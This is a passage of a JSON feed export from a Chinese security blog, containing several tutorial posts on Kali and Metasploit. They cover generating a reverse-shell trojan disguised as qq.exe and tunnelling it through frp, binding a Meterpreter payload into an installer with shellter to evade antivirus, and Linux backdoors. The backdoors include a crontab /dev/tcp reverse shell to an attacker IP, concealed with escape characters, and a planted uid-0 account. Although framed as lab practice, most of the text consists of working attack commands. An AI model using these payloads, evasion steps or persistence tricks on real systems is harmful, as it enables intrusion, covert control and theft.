frps.ini</code>\n<ul>\n<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>\n</ul>\n</li>\n<li>后台运行： <code>nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code>\n<ul>\n<li>因为通常不会 <strong>关闭云服务器</strong>，所以 <strong>后台运行</strong> 就足够了；</li>\n<li>当然也可以 <strong>开启自启动</strong>，详情见 <strong>frpc</strong> 的内容，对应命令改个符号就行～</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"frpckali-虚拟机\"><a class=\"anchor\" href=\"#frpckali-虚拟机\">#</a> frpc（Kali 虚拟机）</h2>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png\" alt=\"image-20230426011342973\" /></p>\n<h3 id=\"下载安装-2\"><a class=\"anchor\" href=\"#下载安装-2\">#</a> 下载安装</h3>\n<p><a href=\"https://github.com/fatedier/frp\"><strong>Github</strong> 项目</a> 上找到最新的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==\">releases</span></p>\n<p>步骤与 <strong>frps</strong> 的几乎<strong>相同</strong>，<strong>区别</strong> 是：</p>\n<ul>\n<li>对象变成了 <strong>Kali 虚拟机</strong>，而不是 云服务器</li>\n<li>以及最后一步 <strong>删除的是 frps</strong>：<br />\n4. 因为配置的是 <strong>frpc</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frps</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frps*</code> </strong></li>\n</ul>\n<h3 id=\"编写-frpc-配置文件\"><a class=\"anchor\" href=\"#编写-frpc-配置文件\">#</a> 编写 frpc 配置文件</h3>\n<p>作为一款 <strong>内网穿透</strong> 工具，<strong>frp</strong> 穿透了内网之后，还需要使用 <strong>其他手段</strong>（<strong>ssh</strong>）<br />\n和外网建立交互，所以 <strong>配置文件</strong> 中会存在 <strong>[ssh]</strong> 配置。</p>\n<p><code>vim frpc.ini</code> <br />\n 内容如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">server_addr = 106.15.52.194</span><br><span class=\"line\">server_port = 7777</span><br><span class=\"line\"></span><br><span class=\"line\">[ssh]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 22</span><br><span class=\"line\">remote_port = 6666</span><br><span class=\"line\">use_compression = true</span><br></pre></td></tr></table></figure><br />\n 相关 <strong>解释</strong> 如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442834/Typera/2023/04/2144e375ff1aca162bb41868d050259f.png\" alt=\"image-20230426011350366\" /></p>\n<h3 id=\"运行-2\"><a class=\"anchor\" href=\"#运行-2\">#</a> 运行</h3>\n<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>\n<ul>\n<li>命令行输入： <code>./frpc -c frpc.ini</code>\n<ul>\n<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>\n</ul>\n</li>\n<li>开机自启动：\n<ul>\n<li>服务目录 <strong>新建并编辑</strong> 文件： <code>vim /lib/systemd/system/frp.service</code></li>\n<li>填入以下内容：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Frp Client Service</span><br><span class=\"line\">After=network.target remote-fs.target nss-lookup.target</span><br><span class=\"line\">Wants=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">ExecStart=/root/frp/frpc -c /root/frp/frpc.ini</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">RestartSec=20s</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>\n<li>启动 <strong>frpc</strong> 服务： <code>systemctl start frp</code> <br />\n（最后的  <code>frp</code>  名称取决于上一步新建的文件名  <code>frp.service</code> ）</li>\n<li>打开 <strong>frpc</strong> 服务自启动  <code>systemctl enable frp</code> <br />\n<strong> [注意]：</strong>\n<ul>\n<li>如果要重启应用： <code>systemctl restart frp</code></li>\n<li>如果要停止应用： <code>systemctl stop frp</code></li>\n<li>如果要查看 <strong>frpc</strong> 的日志： <code>systemctl status frp</code></li>\n<li>权限不够，记得加  <code>sudo</code></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>服务文件</strong> 重要内容注释 如下图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442841/Typera/2023/04/6e79855b87a38703bd5b740419dc6e65.png\" alt=\"image-20230426011356634\" /></p>\n<h2 id=\"ssh-连接测试\"><a class=\"anchor\" href=\"#ssh-连接测试\">#</a> SSH 连接测试</h2>\n<ul>\n<li>命令行  <code>ssh root@x.x.x.x -p 6666</code> <br />\n（<strong>root</strong> 用户登录到 <strong>云服务器 x.x.x.x</strong> 的 <strong>6666</strong> 端口）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442846/Typera/2023/04/52501488b9125c9518e2190783a8fcf4.png\" alt=\"\" /></li>\n<li>Xshell 创建新会话，具体内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442854/Typera/2023/04/891e33c279efacbf48adee134034f971.png\" alt=\"image-20230426011410382\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442861/Typera/2023/04/fe85e7d6d6e0e5955c77ff87a4ea5abe.png\" alt=\"image-20230426011417120\" /><br />\n&lt;br&gt;<br />\n<strong>Xshell  连接成功</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442869/Typera/2023/04/7eed7e40069de144ddcfb74725077325.png\" alt=\"image-20230426011424294\" /></li>\n</ul>\n<h2 id=\"msf-渗透攻击测试\"><a class=\"anchor\" href=\"#msf-渗透攻击测试\">#</a> msf 渗透攻击测试</h2>\n<p>双击打开 刚刚建立的 <strong>Xshell 新会话</strong>（ frp ）.</p>\n<h3 id=\"frpc-添加新配置\"><a class=\"anchor\" href=\"#frpc-添加新配置\">#</a> frpc 添加新配置</h3>\n<p>输入命令： <code>vim frpc.ini</code> ，编辑 <strong>frpc</strong> 配制文件，<br />\n在文件末尾 <strong>添加</strong>：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[msf]</span><br><span class=\"line\">type = tcp</span><br><span class=\"line\">local_ip = 127.0.0.1</span><br><span class=\"line\">local_port = 4444</span><br><span class=\"line\">remote_port = 2333 </span><br></pre></td></tr></table></figure><br />\n 配置内容的 <strong>含义</strong> 与 <strong>[ssh]</strong> 类似，解释如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442874/Typera/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png\" alt=\"image-20230426011431000\" /></p>\n<h3 id=\"msf-生成木马\"><a class=\"anchor\" href=\"#msf-生成木马\">#</a> msf 生成木马</h3>\n<p>与连接 <strong>本地的 shell</strong> 生成木马不同，<br />\n因为我们要使用 <strong>frp 穿透内网</strong> 连接的 shell ，去 <strong>监听木马反弹</strong>的 shell，<br />\n所以我们 <strong>生成木马</strong> 时，设置的 LHOST、LPORT 应当是 <strong>云服务器</strong> 的对应数据。<br />\n（直接用内网测试的时候，LHOST、LPORT 填的是 <strong>本地虚拟机</strong> 的相关数据）</p>\n<p>用 <strong>msf</strong> 生成 <strong>windows</strong> 系统的 <strong>反向 shell</strong> 木马：<br />\n <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe &gt; qq.exe</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442881/Typera/2023/04/f72e4363a982738b25b5976722ab8948.png\" alt=\"image-20230426011437323\" /><br />\n 成功生成木马文件：<strong>qq.exe</strong></p>\n<h3 id=\"msf-监听反弹的-shell\"><a class=\"anchor\" href=\"#msf-监听反弹的-shell\">#</a> msf 监听反弹的 shell</h3>\n<blockquote>\n<p>（确定 frps 、frpc 服务均已在后台运行）<br />\n（事先上传 qq.exe 到测试的靶机，本文用 \tWin7_x64 虚拟机替代）</p>\n</blockquote>\n<blockquote>\n<p>关于<strong>上传</strong>：Kali 虚拟机 开启 <strong>Apache2</strong> 服务，Win7_x64 虚拟机 内网访问下载：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442886/Typera/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png\" alt=\"\" /></p>\n</blockquote>\n<ol>\n<li><code>msfconsole</code>\n<ul>\n<li>打开 <strong>msf</strong></li>\n</ul>\n</li>\n<li><code>use exploit/multi/handler</code>\n<ul>\n<li>选择使用的 exploit</li>\n</ul>\n</li>\n<li><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>\n<ul>\n<li>设置 PAYLOAD （生成木马时使用的）</li>\n</ul>\n</li>\n<li><code>set LHOST 127.0.0.1</code>\n<ul>\n<li>设置 LHOST 为本地 IP</li>\n</ul>\n</li>\n<li><code>set LPORT 4444</code>\n<ul>\n<li>设置 LPORT 为转发的本地端口 4444</li>\n</ul>\n</li>\n<li>run\n<ul>\n<li>开始监听</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<p>（先让 <strong>msf</strong> 开始监听，再双击运行上传的木马文件）</p>\n</blockquote>\n<p>演示如图所示：</p>\n<ul>\n<li>双击 <strong>运行木马</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442892/Typera/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png\" alt=\"image-20230426011447735\" /><br />\n&lt;br&gt;</li>\n<li>msf <strong>开始监听</strong> &amp; 成功获得 meterpreter <strong>shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442902/Typera/2023/04/204ea56873200eb9b2507252955adb2a.png\" alt=\"image-20230426011457351\" /></li>\n</ul>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "frp"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%8D%86%E7%BB%91%E5%B7%A5%E5%85%B7shellter%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/",
            "title": "免杀捆绑工具 shellter 的安装及使用",
            "date_published": "2022-04-16T10:10:24.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>shellter</strong> 是一个<strong>捆绑</strong>工具，采用动态 <strong>shellcode</strong> 注入 的方式，将 <strong>shellcode</strong> 注入到其它程序中，达到<strong>免杀</strong>的效果，躲避杀软的查杀。</p>\n</div>\n<h2 id=\"shellter-安装\"><a class=\"anchor\" href=\"#shellter-安装\">#</a> shellter 安装</h2>\n<ol>\n<li>添加 <strong>i386 32 位</strong> 架构支持、更新 <strong>apt</strong>、安装 <strong>wine</strong> 依赖：\n<ul>\n<li><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32</code></li>\n</ul>\n</li>\n<li>安装 <strong>shellter</strong>：\n<ul>\n<li><code>apt install shellter</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443125/Typera/2023/04/0c4297a033272d1212d9cb86e4daf005.png\" alt=\"image-20230426011840045\" /></li>\n</ul>\n</li>\n</ol>\n<h2 id=\"shellter-使用\"><a class=\"anchor\" href=\"#shellter-使用\">#</a> shellter 使用</h2>\n<blockquote>\n<p>使用 shellter 捆绑 Meterpreter_Reverse_TCP</p>\n</blockquote>\n<p><strong>捆绑步骤：</strong></p>\n<ol>\n<li>命令行输入  <code>shellter</code>  打开工具</li>\n<li>输入  <code>A</code>  或者  <code>a</code> ，选择 <strong>自动模式</strong>；</li>\n<li><code>PE Target:</code>  后输入要进行 <strong>捆绑</strong> 的 <strong>文件路径</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443164/Typera/2023/04/272fa29e9da9d004a3cf25b87079f7de.png\" alt=\"image-20230426011919683\" /><br />\n&lt;br&gt;</li>\n<li>输入 <code>Y</code> ，进入 <strong>隐形模式</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443168/Typera/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png\" alt=\"image-20230426011923428\" /><br />\n&lt;br&gt;</li>\n<li>输入 <code>L</code> ，使用 <strong>payload</strong> 攻击模块列表（即上面的 <strong>1~7</strong> ）</li>\n<li><strong>payload</strong> 编号选择  <code>1</code>  ，使用 Meterpreter_Reverse_TCP 攻击<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443172/Typera/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png\" alt=\"image-20230426011927372\" /><br />\n&lt;br&gt;</li>\n<li>分别输入监听端的 <strong>IP</strong>、<strong>端口号</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443175/Typera/2023/04/396417290b20f351cc3c1d96669a3c4e.png\" alt=\"image-20230426011931101\" /><br />\n&lt;br&gt;</li>\n<li>按  <code>[Enter]</code>  退出 <strong>shellter</strong> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443179/Typera/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png\" alt=\"image-20230426011934700\" /></li>\n</ol>\n<p>&lt;br&gt;</p>\n<p><strong>[关于生成的文件]</strong></p>\n<blockquote>\n<p><strong>捆绑完毕</strong>的文件 会代替 <strong>原文件</strong> ，即出现在 原文件目录 下，<strong>名字相同</strong><br />\n而<strong>原文件</strong>会 <strong>备份</strong> 在目录  <code>/root/Shellter_Backups/</code>  ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443183/Typera/2023/04/9b58fed5ce217d4b84967579f2522d55.png\" alt=\"image-20230426011938517\" /></p>\n</blockquote>\n<h2 id=\"利用-免杀效果\"><a class=\"anchor\" href=\"#利用-免杀效果\">#</a> 利用 &amp; 免杀效果</h2>\n<h3 id=\"利用\"><a class=\"anchor\" href=\"#利用\">#</a> 利用</h3>\n<ol>\n<li>上传到 <strong>Win7_x64</strong> 虚拟机，</li>\n<li><strong>Kali_Linux</strong> 虚拟机打开 <strong>msf</strong> （命令  <code>msfconsole</code> ），监听<strong>反弹 shell</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>反弹 shell</strong> 成功！<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443189/Typera/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png\" alt=\"image-20230426011944783\" /></p>\n<h3 id=\"免杀效果\"><a class=\"anchor\" href=\"#免杀效果\">#</a> 免杀效果</h3>\n<p>我的 <strong>Win7_x64 虚拟机</strong> 安装了 <strong>360 全家桶</strong>，</p>\n<p>但是 <strong>静态检测</strong> 貌似并没有查出 <strong>木马文件</strong>～</p>\n<p>运行木马程序，并成功获得 <strong>meterpreter</strong> 的 <strong>shell</strong> 之后，<strong>360</strong> 竟然也没有第一时间报毒。。。 什么情况 (⊙_⊙)？</p>\n<p>大概一分钟之后，才提示有木马：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443194/Typera/2023/04/69719cbb27c9df97660f0c6405be89c7.png\" alt=\"image-20230426011949574\" /><br />\n（实际上这个时间足够黑客 <strong>迁移进程</strong> 并 <strong>布置后门</strong> 了)</p>\n<p>当然，如果你的电脑以前中过这个毒，<strong>360</strong> 会第一时间反应过来<br />\n（但这要是<strong>还没反应</strong>，<strong>360</strong> 就该进回收站了）</p>\n<p>然后看看 <strong>virustotal</strong> 的检测情况（<strong>31 / 70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==\">检测报告 传送门 1</span><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443198/Typera/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png\" alt=\"image-20230426011954090\" /></p>\n<p><em><strong>对比 ：</strong></em><br />\n使用 同程序 同<strong> payload</strong>，用 <strong>msf</strong> 自带的捆绑手段生成的木马：<br />\n（命令： <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> ）</p>\n<p><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==\">检测报告 传送门 2</span><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443202/Typera/2023/04/c0631de31f6d8f365c052ec14a014b37.png\" alt=\"image-20230426011958597\" /></p>\n<blockquote>\n<p>相比较而言，可以说 <strong>shellter</strong> 的捆绑<strong>免杀</strong>效果比 <strong>msf</strong> 好很多了。</p>\n</blockquote>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "shellter"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/",
            "title": "linux 服务器常见的留后门方式（二）",
            "date_published": "2022-04-02T15:36:35.000Z",
            "content_html": "<div class=\"note primary\">\n<p>整理好了搭环境的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==\">LINUX 后门复现环境搭建</span></p>\n</div>\n<p>攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的<strong>后门</strong>。其目的是，方便攻击者以后对该服务器进行持久性的攻击。</p>\n<p>其中，在 linux 服务器上留后门的常见技术，<strong>本文中会提及</strong>如下几种：</p>\n<ul>\n<li>SSH 公钥免密</li>\n<li>crontab 后门<br />\n...</li>\n</ul>\n<h2 id=\"ssh公钥免密\"><a class=\"anchor\" href=\"#ssh公钥免密\">#</a> SSH 公钥免密</h2>\n<p>简而言之，<strong>SSH 公钥免密</strong>就是，将<strong>攻击者</strong>生成的 <strong>ssh 公钥</strong>写到<strong>目标服务器</strong>的 <code>/root/.ssh/authorized_keys</code>  中（手动在目标机上完成注册），<br />\n然后<strong>攻击者</strong>就可以利用对应的<strong>私钥</strong>免密登录。</p>\n<p><strong>实现：</strong></p>\n<ol>\n<li>\n<p>使用 <strong>Xshell</strong> 的 工具 -&gt; 新建用户密钥生成向导，完成<strong> ssh 公钥、私钥</strong>的生成：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png\" alt=\"image-20230426010853712\" /><br />\n（填入密码)<br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>保存生成的公钥文件（id_rsa_2048.pub），传到<strong>目标服务器</strong>上，<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png\" alt=\"image-20230426010925673\" /><br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>寻找 <strong>authorized_keys</strong> 文件，命令 <code>find -name authorized_keys</code> ，<br />\n如果没有，就通过命令 <code>touch /root/.ssh/authorized_keys</code>  创建。<br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>命令 <code>ssh-keygen -t rsa</code>  开启免密登录功能，<br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>通过命令 <code>cat 公钥路径 &gt;&gt; /root/.ssh/authorized_keys</code>  把公钥写入到<strong> authorized_keys</strong>，完成注册<br />\n &lt;br&gt;</p>\n</li>\n<li>\n<p>修改文件权限 <code>chmod 600 ~/.ssh/authorized_keys</code> <br />\n <code>chmod 700 ~/.ssh</code> <br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>攻击者使用<strong> Xshell</strong> 生成的<strong>私钥</strong>和之前填写的<strong>密码</strong>，登录目标服务器<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png\" alt=\"image-20230426010955314\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png\" alt=\"image-20230426011015095\" /></p>\n</li>\n</ol>\n<h2 id=\"crontab后门\"><a class=\"anchor\" href=\"#crontab后门\">#</a> crontab 后门</h2>\n<p><strong>Crond</strong> 服务启动后，会<strong>定期</strong>（默认一分钟检查一次）检查它的配置文件中，是否有要执行的任务。<br />\n如果有，就会根据<strong>预先设定</strong>的<strong>定时任务规则</strong>自动执行该任务。<br />\ncrontab 是用来定期执行程序的命令，<br />\n我们可以通过<strong> crontab</strong> 命令制造定时后门：<br />\n <code>(crontab -l;echo '*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.158.132/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -</code></p>\n<p><strong>解释：</strong><br />\n <code>echo '*/60 * * * *'</code> ：设定每 60 分钟执行一次；<br />\n <code>exec 9&lt;&gt;/dev/tcp/192.168.158.132/2333</code> ：利用 bash 提供的功能，对 <code>/dev/tcp/</code>  开头的字符串进行<strong>解析</strong>，指定<strong>服务器 IP</strong> 为：192.168.158.132（<strong>攻击机</strong> IP），<strong>端口号</strong>为 2333，指定描述符为 9，建立网络连接；<br />\n <code>exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;</code> ：<strong>文件描述符</strong> 0：stdin，1：stdout，把标准输入输出<strong>都</strong>重定向到描述符 9；<br />\n <code>/bin/bash --noprofile -i</code> ：开一个 Shell。<br />\n其实就是利用 Bash <strong>反弹</strong>一个<strong> Shell</strong> 到指定的攻击者 IP</p>\n<p>（ubuntu 默认<strong>没开</strong> bash 的网络重定向选项，需要加上 <code>–enable-net-redirections</code>  重新编译 bash）</p>\n<p><strong>隐藏：</strong><br />\n但是这样的一个后门，管理员直接执行 <code>crontab -l</code>  就能看到我们设定的定时任务。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png\" alt=\"image-20230426011055514\" /><br />\n 这个命令其实是在读取  <code>/var/spool/cron/crontabs/root</code>  文件。<br />\n所以，我们可以利用 cat 的一个缺陷，使用一些<strong>转义字符</strong>，比如 \\r 回车符 \\n 换行符 \\f 换页符，来<strong>隐藏</strong>我们不想让管理员看到的命令：<br />\n <code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/192.168.158.132/2333;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for </code> whoami <code>%100c\\n&quot;)|crontab -</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png\" alt=\"image-20230426011110789\" /> 但是，若是使用 <code>cat -A /var/spool/cron/crontabs/root</code>  还是可以看到我们隐藏的东西的。</p>\n",
            "tags": [
                "Backdoor",
                "Linux",
                "Kali"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "linux 服务器常见的留后门方式（一）",
            "date_published": "2022-04-02T15:35:57.000Z",
            "content_html": "<div class=\"note primary\">\n<p>整理好了搭环境的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==\">LINUX 后门复现环境搭建</span></p>\n</div>\n<p>攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的<strong>后门</strong>。其目的是，方便攻击者以后对该服务器进行持久性的攻击。</p>\n<p>其中，在 linux 服务器上留后门的常见技术，<strong>本文中会提及</strong>如下几种：</p>\n<ul>\n<li>增加用户账号</li>\n<li>破解用户密码</li>\n<li>放置 SUID Shell</li>\n<li>PAM 后门</li>\n<li>SSH 软链接后门<br />\n...</li>\n</ul>\n<h2 id=\"增加用户账号\"><a class=\"anchor\" href=\"#增加用户账号\">#</a> 增加用户账号</h2>\n<p><strong>前提</strong>：getshell，已获得服务器的 root 权限</p>\n<h3 id=\"uid0用户可远程登陆\"><a class=\"anchor\" href=\"#uid0用户可远程登陆\">#</a> uid=0 用户可远程登陆</h3>\n<p>可以通过下面这一行指令，增加一个<strong>超级用户账号</strong>：<br />\n <code>echo &quot;用户名:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code> <br />\n 然后通过： <code>passed 用户名</code> 命令，修改所设超级用户的密码</p>\n<h4 id=\"实现\"><a class=\"anchor\" href=\"#实现\">#</a> 实现：</h4>\n<p>输入命令：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png\" alt=\"image-20230426005018227\" /><br />\n（增加超级用户 backdoor）<br />\n然后通过 ssh 登录 backdoor 账户：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png\" alt=\"image-20230426005025313\" /><br />\n 可以看到已经是 root 权限了：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png\" alt=\"image-20230426005032317\" /></p>\n<p>原理：给服务器增加一个<strong> ID 为 0</strong> 的账号（因为<strong> root</strong> 的 ID 为 0）<br />\n我们可以通过 <code>vim /etc/passwd</code>  命令打开 passwd，所有用户名称与 ID 的对应关系都保存在这里。<br />\n在文件开头，能看到 root:<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png\" alt=\"image-20230426005041049\" /> 在文件的最后，我们能够找到刚刚添加的账号（backdoor）<br />\n<img 